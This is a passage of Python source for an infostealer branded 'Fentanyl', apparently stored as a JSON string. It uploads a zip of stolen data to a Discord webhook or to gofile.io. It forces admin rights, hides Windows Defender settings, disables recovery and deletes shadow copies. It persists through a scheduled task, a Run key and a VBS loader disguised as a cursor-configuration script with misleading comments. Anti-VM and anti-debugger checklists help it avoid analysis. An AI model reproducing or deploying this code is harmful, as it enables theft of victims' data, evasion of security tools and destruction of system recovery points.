\"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    },\n                     \"footer\": {\n                        \"text\": \"Fentanyl Strikes Again!\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    }\n                }\n            ]\n        }\n        fileEmbed = {\n            \"username\": f\"{os.getlogin()} | Fentanyl\",\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n        }\n        with open(_zipfile,'rb') as infozip:\n            requests.post(self.webhook, json=embed)\n            if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:\n                infozip.seek(0)\n                server = requests.get('https://api.gofile.io/getServer').json()['data']['server']\n                link = requests.post(\n                    url=f\"https://{server}.gofile.io/uploadFile\",\n                    data={\n                        \"token\": None,\n                        \"folderId\": None,\n                        \"description\": None,\n                        \"password\": None,\n                        \"tags\": None,\n                        \"expire\": None\n                },\n                files={\"upload_file\": infozip},\n                ).json()[\"data\"][\"downloadPage\"]\n                a = fileEmbed.copy()\n                a.update({\"content\": f\"{link}\"})\n                requests.post(self.webhook, json=a)\n        os.remove(_zipfile)\n    def forceadmin(self):\n        self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \\'{sys.argv[0]}\\' -WindowStyle Hidden -verb runAs -ArgumentList \\'--nouacbypass\\'>nul')\n        sys.exit()\n    def persist(self):\n        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()\n        except Exception: elevated = False\n        if elevated:\n            try:\n                self.system(f'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"SettingsPageVisibility\" /t REG_SZ /d \"hide:recovery;windowsdefender\" /f >nul')\n                self.system(f'reagentc /disable >nul')\n                self.system(f'vssadmin delete shadows /all /quiet >nul')\n                shutil.copy2(sys.argv[0],'C:\\\\Windows\\\\Cursors\\\\')\n                os.rename(os.path.join('C:\\\\Windows\\\\Cursors',os.path.basename(sys.argv[0]),'C:\\\\Windows\\\\Cursors\\\\cursors.cfg'))\n                with open('cursorinit.vbs','w') as f: f.write('\\' This script loads the cursor configuration\\n\\' And cursors themselves\\n\\' Into the shell so that Fondrvhost.exe (The font renderer)\\n\\' Can use them.\\n\\' It is recommended not to tamper with\\n\\' Any files in this directory\\n\\' Doing so may cause the explorer to crash\\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c C:\\\\Windows\\\\Cursors\\\\cursors.cfg\", 0, True\\n')\n                self.system(f'schtasks /create /tn \"CursorSvc\" /sc ONLOGON /tr \"C:\\\\Windows\\\\Cursors\\\\cursorinit.vbs\" /rl HIGHEST /f >nul')\n                ctypes.windll.kernel32.SetFileAttributesW('C:\\\\Windows\\\\Cursors',0x2)\n                ctypes.windll.kernel32.SetFileAttributesW('C:\\\\Windows\\\\Cursors',0x4)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x256)\n            except Exception: self.exceptions.append(traceback.format_exc())\n        elif (elevated == False) and (os.getcwd() != os.path.join(self.roaming,'Cursors')):\n            try:\n                try: shutil.rmtree(os.path.join(self.roaming,'Cursors'))\n                except Exception: pass\n                os.makedirs(self.roaming+'\\\\Cursors', 0x1ED, exist_ok=True)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x2)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x4)\n                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\\\Cursors',0x256)\n                shutil.copy2(sys.argv[0],os.path.join(self.roaming,'Cursors\\\\'))\n                os.rename(os.path.join(self.roaming,'Cursors\\\\',os.path.basename(sys.argv[0])),os.path.join(self.roaming,'Cursors\\\\cursors.cfg',))\n                binp = \"Cursors\\\\cursors.cfg\"\n                initp = \"Cursors\\\\cursorinit.vbs\"\n                with open(os.path.join(self.roaming,'Cursors\\\\cursorinit.vbs'),'w') as f: f.write(f'\\' This script loads the cursor configuration\\n\\' And cursors themselves\\n\\' Into the shell so that Fondrvhost.exe (The font renderer)\\n\\' Can use them.\\n\\' It is recommended not to tamper with\\n\\' Any files in this directory\\n\\' Doing so may cause the explorer to crash\\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c \\'{os.path.join(self.roaming,binp)}\\'\", 0, True\\n')\n                self.system(f'REG ADD HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"CursorInit\" /t REG_SZ /d \"{os.path.join(self.roaming,initp)}\" /f >nul')\n            except Exception: self.exceptions.append(traceback.format_exc())\ndef handler():\n    try: ticks(0x0000000000F)\n    except Exception: pass\n    internal.stolen = True\n    if config.get('keep-alive'):\n        while True:\n            time.sleep(random.randrange(3400,3800))\n            try: ticks(0x0000000000F)\n            except Exception: pass\ndef stabilizeTicks():\n    if config['antivm']:\n        if os.path.exists('D:\\\\Tools') or os.path.exists('D:\\\\OS2') or os.path.exists('D:\\\\NT3X'): return\n        if ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False): return\n        for process in psutil.process_iter():\n            if process.name() in [\"ProcessHacker.exe\", \"httpdebuggerui.exe\", \"wireshark.exe\", \"fiddler.exe\", \"vboxservice.exe\", \"df5serv.exe\", \"processhacker.exe\", \"vboxtray.exe\", \"vmtoolsd.exe\", \"vmwaretray.exe\", \"ida64.exe\", \"ollydbg.exe\", \"pestudio.exe\", \"vmwareuser.exe\", \"vgauthservice.exe\", \"vmacthlp.exe\", \"vmsrvc.exe\", \"x32dbg.exe\", \"x64dbg.exe\", \"x96dbg.exe\", \"vmusrvc.exe\", \"prl_cc.exe\", \"prl_tools.exe\", \"qemu-ga.exe\", \"joeboxcontrol.exe\", \"ksdumperclient.exe\", \"xenservice.exe\", \"joeboxserver.exe\", \"devenv.exe\", \"IMMUNITYDEBUGGER.EXE\", \"ImportREC.exe\", \"reshacker.exe\", \"windbg.exe\", \"32dbg.exe\", \"64dbg.exex\", \"protection_id.exex\", \"scylla_x86.exe\", \"scylla_x64.exe\", \"scylla.exe\", \"idau64.exe\", \"idau.exe\", \"idaq64.exe\", \"idaq.exe\", \"idaq.exe\", \"idaw.exe\", \"idag64.exe\", \"idag.exe\", \"ida64.exe\", \"ida.exe\", \"ollydbg.exe\"]: return\n        if os.getlogin() in [\"WDAGUtilityAccount\",\"Abby\",\"Peter Wilson\",\"hmarc\",\"patex\",\"JOHN-PC\",\"RDhJ0CNFevzX\",\"kEecfMwgj\",\"Frank\",\"8Nl0ColNQ5bq\",\"Lisa\",\"John\",\"george\",\"PxmdUOpVyx\",\"8VizSM\",\"w0fjuOVmCcP5A\",\"lmVwjj9b\",\"PqONjHVwexsS\",\"3u2v9m8\",\"Julia\",\"HEUeRzl\",\"Joe\"]: return\n        if functions.system(functions, r'wmic path win32_VideoController get name').splitlines()[1] in [\"Microsoft Remote Display Adapter\", \"Microsoft Hyper-V Video\", \"Microsoft Basic Display Adapter\", \"VMware SVGA 3D\", \"Standard VGA Graphics Adapter\",\"NVIDIA GeForce 840M\", \"NVIDIA GeForce 9400M\", \"UKBEHH_S\", \"ASPEED Graphics Family(WDDM)\", \"H_EDEUEK\", \"VirtualBox Graphics Adapter\", \"K9SC88UK\",\"\\u0421\\u0442\\u0430\\u043d\\u0434\\u0430\\u0440\\u0442\\u043d\\u044b\\u0439 VGA \\u0433\\u0440\\u0430\\u0444\\u0438\\u0447\\u0435\\u0441\\u043a\\u0438\\u0439 \\u0430\\u0434\\u0430\\u043f\\u0442\\u0435\\u0440\",]: return\n        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]) <= 50: return\n    if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n    try: handler()\n    except Exception: pass\n\nticks.starttime = time.time()\nif __name__ == \"__main__\": stabilizeTicks()\n"
  }
]